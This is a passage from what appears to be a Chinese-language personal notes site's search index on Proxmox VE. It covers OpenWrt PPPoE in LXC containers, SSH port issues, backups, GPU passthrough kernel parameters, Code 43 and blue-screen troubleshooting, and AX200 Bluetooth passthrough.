19:35:38 2024 daemon.notice pppd[158315]: peer from calling number 00:00:5E:00:01:98 authorized\nWed Jun 12 19:35:38 2024 daemon.notice pppd[158315]: local  LL address fe80::b16e:4c9f:8fb8:4702\nWed Jun 12 19:35:38 2024 daemon.notice pppd[158315]: remote LL address fe80::0200:5eff:fe00:0198\nWed Jun 12 19:35:38 2024 daemon.notice pppd[158315]: local  IP address 100.67.41.202\nWed Jun 12 19:35:38 2024 daemon.notice pppd[158315]: remote IP address 100.67.0.1\nWed Jun 12 19:35:38 2024 daemon.notice pppd[158315]: primary   DNS address 211.138.180.2\nWed Jun 12 19:35:38 2024 daemon.notice pppd[158315]: secondary DNS address 211.138.180.3\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#openwrt-pppoe-no_kernel_support","title":"openwrt pppoe NO_KERNEL_SUPPORT","text":"<p>luci interface \u663e\u793a NO_KERNEL_SUPPORT</p> <p>logread \u62a5\u9519</p> <pre><code>Fri Feb  2 21:23:28 2024 daemon.info pppd[13110]: Plugin pppoe.so loaded.\nFri Feb  2 21:23:28 2024 daemon.info pppd[13110]: PPPoE plugin from pppd 2.4.9\nFri Feb  2 21:23:28 2024 daemon.err pppd[13110]: Couldn't open the /dev/ppp device: Permission denied\nFri Feb  2 21:23:28 2024 daemon.err pppd[13110]: Sorry - this system lacks PPP kernel support\nFri Feb  2 21:23:28 2024 daemon.notice netifd: wan (13110): /usr/sbin/pppd: Sorry - this system lacks PPP kernel support\n</code></pre> <p>\u8be5\u95ee\u9898\u4e3a /dev/ppp \u6743\u9650\u95ee\u9898\u3002host \u4e0a chmod 777 \u662f\u7b80\u5355\u7684\u4e00\u79cd\u89e3\u51b3\u65b9\u5f0f\u3002\u8be6\u60c5\u89c1 pppoe \u7684\u5751\u3002</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u65e0\u6cd5\u4fee\u6539-ssh-\u7aef\u53e3\u56fa\u5b9a\u4e3a-22","title":"\u65e0\u6cd5\u4fee\u6539 ssh \u7aef\u53e3\uff0c\u56fa\u5b9a\u4e3a 22","text":"<p>\u73b0\u8c61\uff1a<code>/etc/ssh/sshd_config</code>\u4e2d\u8bbe\u7f6e\u4e86\u975e 22 \u7aef\u53e3\uff0c\u4f46\u662f s restart ssh \u4ecd\u7136\u4f7f\u7528 22 \u7aef\u53e3\uff08\u597d\u50cf\u6587\u4ef6\u4e2d\u914d\u7f6e\u7684\u7981\u6b62\u5bc6\u7801\u767b\u5f55\u662f\u6b63\u786e\u5e94\u7528\u4e86\u7684\uff09\u3002\u53d1\u73b0 s reload ssh \u53ef\u4ee5\u4e34\u65f6\u5c06\u7aef\u53e3\u6539\u4e3a\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bbe\u7f6e\u7684\u7aef\u53e3\uff08ss -tnlp \u540c\u65f6\u6709 22 \u548c\u8bbe\u7f6e\u7684\u7aef\u53e3\uff09\uff0c\u4f46\u662f restart \u540e\u53c8\u53d8\u56de\u4e86 22</p> <p>\u89e3\u51b3</p> <p>google: pve lxc sshd can't port 22 https://forum.proxmox.com/threads/ssh-doesnt-work-as-expected-in-lxc.54691/post-451843</p> <p>\u8c8c\u4f3c\u91cd\u70b9\u5728\u4e8e ssh.socket \u8fd9\u4e2a</p> <pre><code>systemctl disable ssh.socket\nsystemctl enable ssh\n</code></pre> <p>\u4e0d\u7ba1\u7528</p> <p>\u6dfb\u52a0\u4ee5\u4e0b\u4e24\u884c\uff0cop \u786e\u5b9e\u51fa\u73b0\u4e86 ppp \u8bbe\u5907 (c600, nobody, nobody)\uff0c\u4f46\u662f logread \u4ecd\u7136\u62a5\u9519</p> <pre><code>lxc.cgroup.devices.allow: c 108:0 rwm\nlxc.mount.entry%3A /dev/ppp dev/ppp none bind,create=file\n</code></pre> <p>\u6362\u7528\u7279\u6743\u5bb9\u5668\uff0c\u4ecd\u7136\u62a5\u9519</p> <p>chmod 777 /dev/ppp\uff0cluci\u62a5\u9519\u7a0d\u5fae\u4e0d\u540c\uff0c\u4f46\u4ecd\u7136\u662fNO_KERNEL_SUPPORT</p> <p>host modprobe ppp \u76f8\u5173\u6a21\u5757</p> <pre><code>modprobe tun  \nmodprobe ppp-compress-18  \nmodprobe ppp_mppe  \nmodprobe ppp_deflate  \nmodprobe ppp_async  \nmodprobe pppoatm  \nmodprobe ppp_generic\n</code></pre> <p>\u89e3\u51b3</p> <pre><code>lxc.cgroup.devices.allow: c 108:0 rwm\nhookscript: local:snippets/hookscript.pl\n</code></pre> <pre><code>cp /usr/share/pve-docs/examples/guest-example-hookscript.pl /var/lib/vz/snippets/hookscript.pl\n\nvim /var/lib/vz/snippets/hookscript.pl\n</code></pre> <p>\u6dfb\u52a0\u4e24\u884c system \u8c03\u7528</p> <pre><code># Second phase 'post-start' will be executed after the guest\n    # successfully started.\n    system(\"lxc-device add -n $vmid /dev/ppp\");\n    system(\"lxc-device add -n $vmid /dev/net/tun\");\n\n    print \"$vmid started successfully.\\n\";\n</code></pre> <pre><code>Fri Feb  2 23:29:27 2024 daemon.info pppd[8111]: Renamed interface ppp0 to pppoe-wan\nFri Feb  2 23:29:27 2024 daemon.info pppd[8111]: Using interface pppoe-wan\nFri Feb  2 23:29:27 2024 daemon.notice pppd[8111]: Connect: pppoe-wan &lt;--&gt; eth0\nFri Feb  2 23:29:28 2024 daemon.info pppd[8111]: Remote message: Radius User Restriction [64|FBB&amp;WiFi]\nFri Feb  2 23:29:28 2024 daemon.err pppd[8111]: PAP authentication failed\nFri Feb  2 23:29:28 2024 daemon.notice pppd[8111]: Modem hangup\nFri Feb  2 23:29:28 2024 daemon.notice pppd[8111]: Connection terminated.\nFri Feb  2 23:29:28 2024 daemon.info pppd[8111]: Exit.\n</code></pre> <p>\u53c2\u8003</p> <ul> <li>lxc \u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\u6dfb\u52a0 ppp 108 \u8bbe\u5907\u6743\u9650\uff1a[SOLVED] - PVE 7 - How to make all new CTs have PPP enabled | Proxmox Support Forum</li> <li>\u89e3\u51b3\uff1apve lxc\u5b89\u88c5\u7684openwrt\u62e8\u53f7\u63d0\u793aNO_KERNEL_SUPPORT\uff0c\u5c1d\u8bd5\u591a\u4e2a\u56fa\u4ef6\u90fd\u62e8\u4e0d\u4e0a-\u8f6f\u8def\u7531,x86\u7cfb\u7edf,openwrt(x86),Router OS \u7b49-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn) --&gt; \u6307\u8def\uff1aProxmoxVE 7.0 LXC\u4e0b\u642d\u5efaopenwrt\u8f6f\u8def\u7531_lxc openwrt-CSDN\u535a\u5ba2</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5907\u4efd\u548c\u6062\u590d","title":"\u5907\u4efd\u548c\u6062\u590d","text":"<p>Backup and Restore - Proxmox VE</p> <p>LXC</p> <pre><code> pct restore 100 vzdump-lxc-100-2023_10_03-15_38_23.tar.zst --storage local-zfs\n</code></pre> <p>qm</p> <pre><code>qmrestore \n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u6027\u80fd\u4f18\u5316","title":"\u6027\u80fd\u4f18\u5316","text":"<p>Windows 11 VM (Best Performance) | Proxmox Support Forum</p> <ul> <li>You could use virtio NIC + virtio SCSI.</li> <li>In case you don't plan to migrate those VMs you could set the CPU type to \"host\".</li> <li>Don't overprovision your RAM or CPU cores.</li> <li>Enable NUMA in case you got a multi-socket server.</li> <li>If you got a little big CPU architecture it might help to pin a VM to the performance cores.</li> <li>And in case you trust all your guests you could disable mitigations in the bootloader.</li> </ul> <pre><code>/etc/kernel/cmdline  \n\nmitigations=off  \n\nproxmox-boot-tool refresh\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#pve\u663e\u5361\u76f4\u901a","title":"PVE\u663e\u5361\u76f4\u901a","text":"<p>PCI(e) Passthrough - Proxmox VE PCI Passthrough - Proxmox VE (7) The Ultimate Beginner's Guide to GPU Passthrough (Proxmox, Windows 10) : HomeLab (reddit.com)</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u6b65\u9aa4","title":"\u6b65\u9aa4","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u4fee\u6539\u5185\u6838\u53c2\u6570","title":"\u4fee\u6539\u5185\u6838\u53c2\u6570","text":"<p>p.s grub\u548csystemd-boot\u4fee\u6539\u65b9\u6cd5\u4e0d\u4e00\u6837\uff0c\u8fd9\u91cc\u4ee5systemd-boot\u4e3a\u8bf4\u660e</p> <ul> <li><code>intel_iommu=on | amd_iommu=on</code>\uff1aFor Intel CPUs, you may also need to enable the IOMMU on the\u00a0kernel command line\u00a0for older (pre-5.15) kernels. For AMD CPUs it should be enabled automatically.</li> <li><code>iommu=pt</code>\uff1aIf your hardware supports IOMMU passthrough mode, enabling this mode might increase performance.</li> </ul> <ul> <li>(optional)\u542f\u7528acs override</li> </ul> <p>\u975egrub\u4fee\u6539\u5185\u6838\u53c2\u6570\u65b9\u6cd5</p> <p>\u6211\u4f7f\u7528zfs\uff0cpve8.0 root\u5206\u533a\u4e5f\u4f4d\u4e8ezfs\uff0c\u4f7f\u7528systemd-boot\u5f15\u5bfc\u3002\u56e0\u6b64\u5185\u6838\u53c2\u6570\u9700\u8981\u5728<code>/etc/kernel/cmdline</code>\u4fee\u6539\u3002 - Grub\uff1aThe kernel commandline needs to be placed in the variable\u00a0GRUB_CMDLINE_LINUX_DEFAULT\u00a0in the file\u00a0<code>/etc/default/grub</code>. Running\u00a0<code>update-grub</code>\u00a0appends its content to all\u00a0linux\u00a0entries in\u00a0/boot/grub/grub.cfg.</p> <ul> <li>Systemd-boot<ul> <li>The kernel commandline needs to be placed as one line in\u00a0<code>/etc/kernel/cmdline</code>. To apply your changes, run\u00a0<code>proxmox-boot-tool refresh</code>, which sets it as the\u00a0option\u00a0line for all config files in\u00a0<code>loader/entries/proxmox-*.conf</code>.</li> </ul> </li> </ul> <p>\u6700\u540e\u7684\u5185\u6838\u53c2\u6570</p> <pre><code>#/etc/kernel/cmdline\nroot=ZFS=rpool/ROOT/pve-1 boot=zfs amd_iommu=on iommu=pt pcie_acs_override=downstream,multifunction\n</code></pre> <p>\u66f4\u65b0\u5f15\u5bfc\u53c2\u6570\uff1a<code>proxmox-boot-tool refresh</code></p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#kernel-module","title":"kernel module","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u8bbe\u7f6e\u5c3d\u65e9\u52a0\u8f7d","title":"\u8bbe\u7f6e\u5c3d\u65e9\u52a0\u8f7d","text":"<p>\u4fdd\u8bc1\u4ee5\u4e0bmodule\u5c3d\u65e9\u52a0\u8f7d\uff0c\u5c06\u5176\u6dfb\u52a0\u5230<code>/etc/modules</code></p> <pre><code>vfio\nvfio_iommu_type1\nvfio_pci\nvfio_virqfd\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u8bbe\u7f6e\u6a21\u5757\u53c2\u6570","title":"\u8bbe\u7f6e\u6a21\u5757\u53c2\u6570","text":"<p>\u4fee\u6539\u4e00\u4e9b\u5185\u6838\u6a21\u5757\u7684\u53c2\u6570\uff0c\u4f4d\u4e8e<code>/etc/modprobe.d</code></p> <p>vifo.conf</p> <ul> <li>disable_vga\u540e\uff0cpve\u542f\u52a8\u65f6\u663e\u793a\u5668\u4f1a\u65e0\u6cd5\u4f7f\u7528\uff08vifo\u63a5\u7ba1\u663e\u5361\u540e\uff0c\u5c4f\u5e55\u4fbf\u4f1a\u5361\u4f4f\u4e0d\u53d8\u4e86\uff09</li> </ul> <pre><code>options vfio-pci ids=10de:1b81,10de:10f0,10de:1c02,10de:10f1 disable_vga=1\n</code></pre> <p>kvm.conf</p> <pre><code>options kvm ignore_msrs=1 report_ignored_msrs=0\n</code></pre> <p>blacklist.conf</p> <pre><code>blacklist nouveau\nblacklist nvidia*\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u66f4\u65b0initramfs","title":"\u66f4\u65b0initramfs","text":"<p>\u6bcf\u5f53\u4fee\u6539\u5185\u6838\u6a21\u5757\u540e\uff0c\u9700\u8981\u91cd\u65b0\u751f\u6210initramfs\u3002 <code>update-initramfs -u</code></p> <ul> <li><code>-u</code>: update</li> <li><code>-k a</code>: \u6307\u5b9a\u4e00\u4e2a\u5185\u6838\u7248\u672c\u6216\u8005all\u6307\u5b9a\u6240\u6709</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#acs-override","title":"ACS override","text":"<p>VFIO tips and tricks: VFIO+VGA FAQ</p> <p>pcie_acs_override = [PCIE] Override missing PCIe ACS support for: downstream All downstream ports - full ACS capabilties multifunction All multifunction devices - multifunction ACS subset id:nnnn:nnnn Specfic device - full ACS capabilities Specified as vid:did (vendor/device ID) in hex</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#boot-gpu\u76f4\u901a\u95ee\u9898","title":"boot gpu\u76f4\u901a\u95ee\u9898","text":"<p>960\uff08\u7b2c\u4e00\u4e2a\u69fd\uff09\uff0c\u9700\u8981\u5173\u95ed\u663e\u793a\u5668\u91cd\u542fpve\uff0c\u624d\u80fd\u6b63\u786e\u5de5\u4f5c\u3002\u6dfb\u52a0\u5185\u6838\u53c2\u6570video=efifb:off\u540e\uff0c\u8fde\u63a5\u663e\u793a\u5668\u91cd\u542f\u6ca1\u95ee\u9898\uff1f</p> <p><code>video=efifb:off</code>\u00a0and related kernel parameters don't work on Proxmox anymore. Use\u00a0this work-around\u00a0when doing\u00a0passthrough\u00a0of the boot (or only) GPU. Also,\u00a0<code>amd_iommu=on</code>\u00a0really does nothing and\u00a0<code>iommu=pt</code>\u00a0does mostly nothing. And\u00a0not all\u00a0Proxmox installations use GRUB.</p> <p>What a nice post! I've been looking for a solution to this BAR 3 issues all night. Big Thanks! By the way, I also found better solution on a reddit post. It is adding \"<code>initcall_blacklist=sysfb_init</code>\" to kernel parameter. No need \"<code>video=efifb:off</code>\" or \"<code>video=simplefb:off</code>\" in kernel parameter. I also tested, it does solve the problem! Reference: https://www.reddit.com/r/VFIO/comme...let_simplefb_stay_away_from_the_gpu/?sort=old https://www.reddit.com/r/Proxmox/comments/vc9hw3/latest_proxmox_7_the_kernel_breaks_my_gpu/?sort=old</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#amd-6500xt-43\u9519\u8befbios\u5173\u95edresizable-bar","title":"amd 6500xt 43\u9519\u8bef\uff08BIOS\u5173\u95edresizable BAR\uff09","text":"<p>\u7ed9czw\u76f4\u901a6500xt\uff0c\u7ed3\u679c\u5373\u4f7f\u5b89\u88c5\u5b8camd\u9a71\u52a8\u540e\u4ecd\u7136\u62a543\u9519\u8bef\u3002\u6700\u540e\u53d1\u73b0\u662fAMD GPU\u7684\u95ee\u9898\uff0c\u9700\u8981\u5173\u95edResizable BAR/Smart Access Memory\u00a0https://pve.proxmox.com/wiki/PCI_Passthrough#BIOS_options </p> <p>\"Resizable BAR'/'Smart Access Memory': Some AMD GPUs (Vega and up) experience 'Code 43' in Windows guests if this is enabled on the host. It's not supported in VMs either way (yet), so the recommended setting is 'off'.\"</p> <p>https://forum.proxmox.com/threads/gpu-passthrough-radeon-6800xt-and-beyond.86932/post-561971</p> <p>\u603b\u7ed3</p> <ul> <li>\u6709\u7528<ul> <li>\u5173\u95edbios csm\u548csmart access memory</li> <li>\u6dfb\u52a0\u5185\u6838\u53c2\u6570<code>initcall_blacklist=sysfb_init</code>\uff08<code>video=efifb:off</code>\u4ecd\u7136\u4fdd\u7559\uff09\uff0c\u91cd\u542fpve</li> </ul> </li> <li>\u65e0\u7528<ul> <li>\u6211\u81ea\u5df1\u8bc4\u8bba\u7684\uff1aI firstly tryed another method, since driver 43 error is a common problem when using libvirt to create VM. see\u00a0ovmf arch wiki 43.\u00a0 So I did similar thing: edit guest qemu config file(/etc/pve/qemu-sever/ VM id.conf), modify cpu property to \"cpu: host,hidden=1,hv-vender-id=123456789\".</li> </ul> </li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#windows\u968f\u673a\u84dd\u5c4fbosd\u4fee\u6539cpu-x86-v3","title":"windows\u968f\u673a\u84dd\u5c4fBOSD\uff08\u4fee\u6539cpu x86-v3\uff09","text":"<p>VIDEO_DXGKRNL</p> <ul> <li>10\u6765\u5206\u949f\u5c31\u84dd\u5c4f\uff0c\u6ca1\u6709\u89e6\u53d1\u6761\u4ef6</li> <li>gfe\u5b89\u88c5\u6700\u65b0\u9a71\u52a8\uff0c\u5b89\u88c5\u5b8c\u6210\u65f6\u9ed1\u5c4f\uff0c\u53ea\u80fd\u5728pve console\u91cc\u64cd\u4f5c\u3002<ul> <li>\u53ef\u4ee5\u518d\u6b21\u70b9\u51fb\u5feb\u901f\u5b89\u88c5\u5b89\u88c5\u9a71\u52a8</li> <li>\u53ef\u4ee5\u770b\u5230\u8bbe\u5907\u7ba1\u7406\u5668\u4e2d\u663e\u5361\u62a513\u9519\u8bef</li> <li>\u91cd\u542f\u540e\u663e\u793a\u5b89\u88c5\u4e0a\u4e86\uff0c\u4f46\u662f\u5982\u679c\u91cd\u65b0\u5b89\u88c5\u53c8\u662f\u4ee5\u4e0a\u6b65\u9aa4</li> </ul> </li> </ul> <p>\u5c1d\u8bd5</p> <ul> <li>\u5173\u95edvnc, parsec, \u5c0f\u98de\u673a\u7b49\u53ef\u80fd\u4fee\u6539\u663e\u5361\u7684\u8f6f\u4ef6</li> <li>\u52fe\u4e0aprimay gpu</li> <li>\u4f7f\u7528\u7f51\u4e0a\u4e0b\u8f7d\u7684msi \u516c\u7248vbios\uff0c\u8bbe\u7f6eromfile\u53c2\u6570VGA Bios Collection: MSI GTX 1070 8 GB | TechPowerUp</li> <li>\u5b89\u88c5studio\u9a71\u52a8\uff08\u4ecd\u7136\u4f1a\u6709\u4e0a\u9762\u95ee\u9898\uff09</li> </ul> <p>Urgent Help, Windows 10 Crash!!! BSOD VIDEO_DXGKRNL_FATAL_ERROR | Proxmox Support Forum</p> <p>\u628a\u4e0b\u9762\u53e5\u5b50\u7ffb\u8bd1\u6210\u82f1\u6587\uff1a \u6211\u9047\u5230\u4e86\u5b8c\u5168\u4e00\u6837\u7684\u95ee\u9898\uff0c\u6211\u7684win10\u865a\u62df\u673a\u6700\u8fd1\u5f00\u59cb\u968f\u673a\u84dd\u5c4f\u3002\u5b83\u8fc7\u53bb3\u4e2a\u661f\u671f\u662f\u5f88\u6b63\u5e38\u7684\u3002\u6211\u5c1d\u8bd5\u4e86\u5f88\u591a\u65b9\u6cd5\uff08reinstall win10, try win11, pass vbios rom file\uff09\uff0c\u95ee\u9898\u4ecd\u6ca1\u89e3\u51b3\u3002\u76f4\u5230\u6211\u770b\u5230\u4e86\u4f60\u7684\u5e16\u5b50\uff0c\u6211\u4e5f\u5c1d\u8bd5\u628aCPU\u4ecehost\u6539\u4e3akvm64\uff0c\u95ee\u9898\u5c45\u7136\u795e\u5947\u7684\u89e3\u51b3\u4e86\u3002</p> <p>\u7ecf\u8fc7\u6211\u4e4b\u524d\u975e\u5e38\u591a\u7684\u5c1d\u8bd5\uff0c\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a\u80fd\u591f\u7a33\u5b9a\u89e6\u53d1BOSD\u7684\u65b9\u6cd5\uff0c\u90a3\u5c31\u662f\u4f7f\u7528GPU-Z\u8f6f\u4ef6\u5bfc\u51faGPU\u7684vbios\uff0c\u6bcf\u6b21\u786e\u8ba4\u5bfc\u51fa\u65f6\uff0cwin10\u7cfb\u7edf\u5c31\u4f1a\u84dd\u5c4f\u3002</p> <p>\u5e76\u4e14\u6211\u4e5f\u53d1\u73b0\u4e86\u4e00\u4e2a\u4e0d\u592a\u6b63\u5e38\u7684\u73b0\u8c61\u3002GPU-Z\u53ea\u6709\u5728\u7b2c\u4e00\u6b21\u6253\u5f00\u65f6UEFI\u72b6\u6001\u662f\u52fe\u4e0a\u7684\uff0c\u5173\u95edGPU-Z\u8f6f\u4ef6\u7136\u540e\u518d\u6253\u5f00\uff0cUEFI\u5c31\u4f1a\u53d8\u4e3a\u672a\u52fe\u9009\u72b6\u6001\u3002\u5e76\u6253\u5f00GPU-Z\u8f6f\u4ef6\u51e0\u79d2\u540e\uff0cbus interface\u4e5f\u4f1a\u4ecePCIex16 3.0@x16 3.0\u53d8\u4e3a PCI\u3002</p> <p>\u5728\u5c06CPU\u4ecehost\u6362\u6210KVM64\u540e\uff0c\u4e0a\u9762\u7684\u95ee\u9898\u5c31\u88ab\u89e3\u51b3\u4e86\u3002GPU-Z UEFI\u548cbus interface\u663e\u793a\u7684\u90fd\u662f\u6b63\u786e\u7684\u3002</p> <p>VIDEO_DXGKRNL_FATAL_ERROR in a Windows VM - workarounds? | Proxmox Support Forum</p> <ul> <li>\u8fd9\u4e2a\u5e16\u5b50\u8ba4\u4e3a\u662fMSI\u8fd9\u79cd\u8f6f\u4ef6\u8bfb\u53d6\u4e86\u5e95\u5c42\u7684\u4e0d\u5b58\u5728\u7684\u5bc4\u5b58\u5668\u5bfc\u81f4\u7cfb\u7edf\u5d29\u6e83</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#43\u9519\u8bef\u603b\u7ed3","title":"43\u9519\u8bef\u603b\u7ed3","text":"<ol> <li>\u663e\u5361\u9a71\u52a8\u68c0\u6d4b\u865a\u62df\u673a \u6700\u65e9\u4f7f\u7528KVM\u521b\u5efa\u865a\u62df\u673a\uff0c\u9047\u5230\u7684\u4fbf\u662f\u8fd9\u4e2a\u3002\u5b89\u88c5\u82f1\u4f1f\u8fbe\u6700\u65b0\u9a71\u52a8\u5373\u53ef</li> </ol> <p>Video card drivers by AMD incorporate very basic virtual machine detection targeting Hyper-V extensions. Should this detection mechanism trigger, the drivers will refuse to run, resulting in a black screen. Nvidia guest drivers prior to version 465 exhibited a similar behaviour which resulted in a generic error 43 in the card's device manager status. Systems using these older drivers therefore also need the above modification. In addition, they also require hiding the KVM CPU leaf</p> <ol> <li>Resizable Bar is turned on in the bios</li> </ol> <p>If you own a GPU that supports Resizable BAR / SAM and have the corresponding BIOS option enabled, you might get code 43 because this feature is disabled in QEMU\u00a0[11]. Linux Kernel release 6.1 added option to manipulate PCIe Resizable BARs through\u00a0sysfs, so you can try permanently resizing it using a\u00a0udev\u00a0rule:</p> <pre><code>/etc/udev/rules.d/01-amd.rules\n\nACTION==\"add\", SUBSYSTEM==\"pci\", ATTR{vendor}==\"0x1002\", ATTR{device}==\"0x73bf\", ATTR{resource0_resize}=\"14\"\nACTION==\"add\", SUBSYSTEM==\"pci\", ATTR{vendor}==\"0x1002\", ATTR{device}==\"0x73bf\", ATTR{resource2_resize}=\"8\"\n</code></pre> <p>Alternatively, to temporarily resize the PCIe BAR, you can write the new size to\u00a0<code>/sys/bus/pci/devices/_device_address_/resource_number__resize</code>, where\u00a0device_address\u00a0is the address of your GPU, such as\u00a0<code>0000:03:00.0</code>\u00a0(note that for changing this parameter, no driver can be loaded for the device).</p> <p>You can confirm values using\u00a0<code>lspci -vvvxxxx</code>.</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u76f4\u901a-ax200-\u6ca1\u6709\u84dd\u7259\u89e3\u51b3","title":"\u76f4\u901a AX200 \u6ca1\u6709\u84dd\u7259\uff08\u89e3\u51b3\uff09","text":"<p>[\u6c42\u52a9] VM \u76f4\u901a AX210 \u84dd\u7259\u9047\u5230\u95ee\u9898 - Chinese / \u7b80\u4f53\u4e2d\u6587 - Unraid</p> <ul> <li>\u770b\u5230\u522b\u4eba\u90fd\u662f lsusb \u80fd\u770b\u5230\u96c6\u6210\u7684\u84dd\u7259\uff0c\u4f46\u662f\u6211\u7684\u6ca1\u6709\u3002</li> </ul> <p>[SOLVED] No bluetooth adaptater on AX200 / Kernel &amp; Hardware / Arch Linux Forums \u6211\u7684\u8f93\u51fa\u6ca1\u6709\u4efb\u4f55 firware load \u7684\u4fe1\u606f</p> <pre><code>root@ryzen-pve \u279c  ~ dmesg | grep firm\n[    0.512405] Spectre V2 : Enabling Restricted Speculation for firmware calls\n[    7.689816] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2\n\nroot@ryzen-pve \u279c  ~ ls /lib/firmware |grep a0\niwlwifi-cc-a0-66.ucode.xz\niwlwifi-cc-a0-72.ucode.xz\n</code></pre> <p>\u6211\u8fd9\u91cc\u6ca1\u6709 AX200 Bluetooth\uff0c\u8fd9\u662f\u522b\u4eba\u7684\u8f93\u51fa</p> <pre><code>[(16:36:45)xeph:~]lsusb\nBus 004 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub\nBus 003 Device 003: ID 8087:0029 Intel Corp. AX200 Bluetooth\nBus 003 Device 002: ID 046d:c52b Logitech, Inc. Unifying Receiver\nBus 003 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub\nBus 002 Device 002: ID 05e3:0620 Genesys Logic, Inc. GL3523 Hub\nBus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub\nBus 001 Device 004: ID 048d:c101 Integrated Technology Express, Inc. ITE Device(8910)\nBus 001 Device 003: ID 13d3:56ff IMC Networks Integrated Camera\nBus 001 Device 002: ID 05e3:0610 Genesys Logic, Inc. Hub\nBus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub\n</code></pre> <p>\u611f\u89c9\u53ef\u80fd\u662f\u56e0\u4e3a\u7ed1\u5b9a\u4e86 vifo-pci \u5bfc\u81f4\u7684\uff1f Does anyone know how to pass through the Wi Fi 6 ax200 network card to a virtual machine with Kali Linux OS? - VM Engine (KVM) - Unraid --- \u6709\u8c01\u77e5\u9053\u5982\u4f55\u901a\u8fc7 Wi Fi 6 ax200 \u7f51\u5361\u4f20\u9012\u5230\u5e26\u6709 Kali Linux \u64cd\u4f5c\u7cfb\u7edf\u7684\u865a\u62df\u673a\uff1f- \u865a\u62df\u673a\u5f15\u64ce\uff08KVM\uff09 - \u53d6\u6d88\u7a81\u88ad [6.10.0-RC1] Onboard Bluetooth no longer able to passthrough to VM - Prereleases - Unraid --- [6.10.0-RC1]\u677f\u8f7d\u84dd\u7259\u65e0\u6cd5\u518d\u76f4\u901a\u5230 VM - \u552e\u524d\u8d5b - \u53d6\u6d88\u7a81\u88ad</p> <p>\u597d\u50cf\u548c\u6211\u4e00\u6837\uff0c\u84dd\u7259\u4ece usb \u4e2d\u6d88\u5931 PVE 7.4 + Home Assistant: Intel AX200 Bluetooth issues | Proxmox Support Forum --- PVE 7.4 + \u5bb6\u5ead\u52a9\u7406\uff1a\u82f1\u7279\u5c14 AX200 \u84dd\u7259\u95ee\u9898 |Proxmox \u652f\u6301\u8bba\u575b</p> <p>\u65e7\u7b14\u8bb0\u672c\u4e0a\u7684 ax200 lsusb \u786e\u5b9e\u80fd\u770b\u5230\u8bbe\u5907</p> <p>update\uff1a\u53ef\u80fd\u539f\u56e0\u786e\u5b9e\u662f\u7ed1\u5b9a\u4e86 vifo-pci\uff0c\u5bfc\u81f4\u6ca1\u6709\u770b\u5230 bluetooth\u3002\u540e\u9762\u4e0d\u77e5\u9053\u600e\u4e48\u80fd\u770b\u5230 usb \u84dd\u7259\u4e86\u3002 \u4f46\u5728 win10 \u865a\u62df\u673a\u4e2d\uff0c\u65e0\u6cd5\u8bc6\u522b\u8bbe\u5907</p> 